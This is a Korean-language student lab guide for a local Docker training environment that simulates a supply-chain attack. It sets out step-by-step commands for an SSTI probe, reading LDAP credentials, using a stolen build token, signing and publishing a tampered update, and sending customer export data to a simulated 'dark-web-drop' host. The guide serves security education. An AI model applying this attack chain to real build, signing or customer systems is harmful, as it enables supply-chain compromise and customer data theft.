# 02. Student Lab Guide

## 시작 전 전제

이 실습은 실제 기업망 공격이 아닙니다. 모든 행동은 로컬 Docker Compose 환경 안에서만 동작하도록 제한되어 있습니다.

학습자는 이미 다음 내용을 들었다고 가정합니다.

- Supply Chain Attack
- Trust Relationship
- Token / SSO
- CI/CD Pipeline
- Signing
- Evidence & Detection

## Lab 실행

```powershell
docker compose up --build -d
```

브라우저 또는 curl로 진입점을 확인합니다.

```text
http://localhost:28181
```

## Stage 0. Recon

목표:

공개 페이지와 메타데이터에서 제품, 고객, 버전, 업데이트 채널 단서를 확인합니다.

확인 대상:

```powershell
Invoke-RestMethod http://localhost:28181/
```

학습 포인트:

- 공개 문서와 release note는 공격 표면을 이해하는 첫 단서가 됩니다.
- 고객명, 제품명, 버전, update channel은 이후 공급망 공격 흐름과 연결됩니다.

## Stage 1. Initial Access

목표:

`support-portal`의 실제 Jinja2 draft preview 기능에서 SSTI가 가능한지 확인하고, 포털 UI 안에서 다음 업무 흐름인 Diagnostics를 발견합니다.

```powershell
Invoke-RestMethod http://localhost:28181/ticket/preview `
  -Method Post `
  -ContentType 'application/x-www-form-urlencoded' `
  -Body 'body={{7*7}}'
```

학습 포인트:

- 초기 접근은 최종 목표가 아니라 내부 흐름으로 들어가기 위한 시작점입니다.
- `{{ 7 * 7 }}`이 `49`로 렌더링되면 사용자의 입력이 서버 템플릿 엔진에서 평가되고 있다는 뜻입니다.
- `{{7*7}}`은 SSTI 확인에서 널리 쓰이는 관습적인 산술 페이로드입니다. 특정 문서에서 훔쳐본 정답이 아니라, 템플릿 엔진이 표현식을 평가하는지 확인하는 최소 실험입니다.
- 화면의 Diagnostics 버튼은 다음 단계로 이동하는 업무 UI 단서입니다. 이 단계는 숨겨진 경로 암기가 아니라, 지원 포털에서 제공하는 진단 기능을 따라가는 흐름입니다.

## Stage 2. Support Diagnostics Directory Profile

목표:

지원 포털의 Diagnostics 화면에서 Directory bind profile을 열어 내부 wiki와 LDAP 접속 정보를 확인합니다.

```powershell
# Browser path:
# 1. Open http://localhost:28181/
# 2. Click Diagnostics
# 3. Open Directory bind profile

# API equivalent:
Invoke-RestMethod http://localhost:28181/support/read/list
Invoke-RestMethod 'http://localhost:28181/support/read?k=ldap'
```

학습 포인트:

- 현실적인 기업 환경에서는 지원 포털이 내부 디렉터리, wiki, 티켓 시스템과 연동되는 경우가 많습니다.
- 이 단계의 핵심 단서는 `LDAP_URI`, `LDAP_BIND_DN`, `LDAP_BIND_PW`, `WIKI_URL`입니다.
- 브라우저에서는 실제 업무 화면처럼 보이고, 자동 검증이나 curl에서는 같은 리소스를 JSON/text API로 확인할 수 있습니다.

## Stage 3. Safe C2 Emulator

목표:

실제 C2가 아니라 안전한 emulator로 작전 채널 등록 개념을 확인합니다.

운영 방식:

Stage 3부터 사용하는 `docker compose exec -T support-portal python -`는 실제 reverse shell이 아니라, 이미 확보한 support-portal foothold에서 실행되는 **controlled operator console**을 표현합니다. 학습 환경에서는 임의 shell, 파일 쓰기, 외부 callback을 열지 않기 위해 이 console만 내부 HTTP 요청을 수행할 수 있게 제한합니다.

```powershell
@'
import httpx, json
res = httpx.post("http://c2-emulator:8000/beacon/register", json={
    "host": "support-portal",
    "reachable_targets": ["wiki", "ticket-service", "source-repo", "build-server", "update-server", "customer-api"],
})
print(json.dumps(res.json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- C2는 post-exploitation lifecycle을 이해하기 위한 개념입니다.
- 이 lab의 C2는 shell, file write, external callback을 제공하지 않습니다.

## Stage 4. Internal Discovery

목표:

내부 서비스 목록을 확인하고 망 경계를 이해합니다.

```powershell
@'
import httpx, json
res = httpx.get("http://c2-emulator:8000/discover/services")
print(json.dumps(res.json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- `corp`, `dev`, `release`, `customer` 영역은 서로 다른 신뢰 경계를 가집니다.
- 서비스 이름은 다음 공격 단계의 지도 역할을 합니다.

## Stage 5. Evidence Collection

목표:

wiki, ticket, source repo를 확인해 build token과 release channel 단서를 찾습니다.

```powershell
@'
import httpx, json
targets = [
    ("Build runbook", "http://wiki:8000/pages/release/runbook-build-trigger"),
    ("Ticket clue", "http://ticket-service:8000/tickets/OES-1287"),
    ("Release repo file", "http://source-repo:8000/files/release-pipeline/release.json"),
]
for title, url in targets:
    print("\n##", title)
    print(json.dumps(httpx.get(url).json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- 실제 환경에는 valid clue, partial clue, decoy, routine noise가 섞여 있습니다.
- 실무 분석은 “정답 문자열 찾기”가 아니라 근거를 연결하는 과정입니다.

## Stage 6. Build Token Use

목표:

valid `BUILD_TRIGGER_TOKEN`으로 build job을 실행합니다.

```powershell
@'
import httpx, json
res = httpx.post("http://build-server:8000/api/jobs", json={
    "repo": "orionecho/echo-agent",
    "ref": "refs/heads/release/2.6.4",
    "channel": "anrc",
    "trigger_token": "build-trigger-demo-7f3a91",
})
print(json.dumps(res.json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- token은 계정 비밀번호가 아니어도 시스템 간 접근 권한을 열 수 있습니다.
- DevOps 경계는 공급망 공격에서 핵심 전환점입니다.

## Stage 7. Artifact Build

목표:

생성된 artifact metadata와 marker를 확인합니다.

```powershell
@'
import httpx, json
res = httpx.get("http://build-server:8000/api/artifacts/art-demo-001")
print(json.dumps(res.json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- 정상 소스코드만 보는 것으로는 충분하지 않습니다.
- build log, artifact hash, marker, job metadata를 함께 확인해야 합니다.

## Stage 8. Sign and Publish

목표:

artifact를 ANRC update channel에 publish합니다.

```powershell
@'
import httpx, json
artifact = httpx.get("http://build-server:8000/api/artifacts/art-demo-001").json()
canonical = {
    "product": "EchoAgent",
    "channel": "anrc",
    "version": "2.6.4",
    "build_id": "build-2026-0502-001",
    "artifact": {
        "name": artifact["name"],
        "sha256": artifact["sha256"],
        "url": "http://updates.release.local/artifacts/" + artifact["name"],
        "size_bytes": artifact["size_bytes"],
    },
    "metadata": {"customer": "anrc", "lab_marker": artifact["marker"]},
}
signature = httpx.post(
    "http://signing-service:8000/api/sign",
    json={"canonical_manifest": canonical},
).json()["signature"]
manifest_to_publish = dict(canonical)
manifest_to_publish["signature"] = signature
published = httpx.post(
    "http://update-server:8000/internal/publish",
    json={"channel": "anrc", "manifest": manifest_to_publish},
).json()
print(json.dumps({"manifest": manifest_to_publish, "published": published}, indent=2))
manifest = httpx.get("http://update-server:8000/channels/anrc/manifest.json").json()
print(json.dumps(manifest, indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- signing은 배포 신뢰를 만드는 과정입니다.
- 오염된 산출물이 정상 서명과 update channel을 통과하면 고객은 정상 업데이트로 받아들일 수 있습니다.

## Stage 9. Customer Trusted Update

목표:

ANRC customer app이 update를 신뢰하고 적용하는 과정을 확인합니다.

```powershell
@'
import httpx, json
print(json.dumps(httpx.post("http://customer-app:8000/api/poll-now").json(), indent=2))
print(json.dumps(httpx.get("http://customer-api:8000/metadata").json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- 고객망을 직접 공격하지 않아도 고객 환경에 영향이 전달될 수 있습니다.
- 고객 update log와 agent telemetry가 중요한 증거입니다.

## Stage 10. Customer Export and Final Object

목표:

고객 API에서 export 정보를 찾고 final object를 확인합니다.

```powershell
@'
import httpx, json
for path in ["/metadata", "/facilities", "/audits", "/exports"]:
    print("\n##", path)
    print(json.dumps(httpx.get("http://customer-api:8000" + path).json(), indent=2))

detail = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007").json()
print("\n## export detail")
print(json.dumps(detail, indent=2))
print("\n## final object")
print(httpx.get(detail["presigned_url"]).text)
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- 최종 목표는 단순 침투가 아니라 신뢰 관계를 따라 고객 데이터에 도달하는 것입니다.
- export metadata, object key, presigned URL은 방어자에게도 중요한 증거입니다.

## Stage 11. Customer Data Exfiltration To Dark Web

목표:

Stage 10에서 확인한 ANRC export 파일을 실제로 회수한 뒤 controlled Dark Web drop simulator에 제출합니다.
drop directory를 감시하던 supervisor bot이 파일명, export id, object key, dataset, object access proof를 검증하고 통과 여부를 반환합니다.

```powershell
@'
import httpx, json
detail = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007").json()
final_object = httpx.get(detail["presigned_url"]).text
bundle = httpx.post("http://dark-web-drop:8000/drop/submit", json={
    "filename": "project-orion-echo-final.txt",
    "export_id": detail["id"],
    "object_key": detail["object_key"],
    "file_content": final_object,
}).json()
print(json.dumps(bundle, indent=2))
print(json.dumps(httpx.get("http://dark-web-drop:8000/drop/status/" + bundle["submission_id"]).json(), indent=2))
'@ | docker compose exec -T support-portal python -
```

학습 포인트:

- 정본 Orion Echo 시나리오의 마지막은 Defender Report가 아니라 Dark Web Impact입니다.
- 최종 단계는 metadata만 제출하는 것이 아니라, 올바른 고객 export 파일을 가져왔는지 supervisor bot이 검증하는 방식입니다.
- `export_id`, `object_key`, `received_file`, `checks`, `exposed_dataset`, `dark_web_drop_record`가 서로 연결되어야 최종 영향이 설명됩니다.
- 이 lab의 Dark Web drop은 실제 외부 네트워크가 아니라 교육용 로컬 simulator입니다.


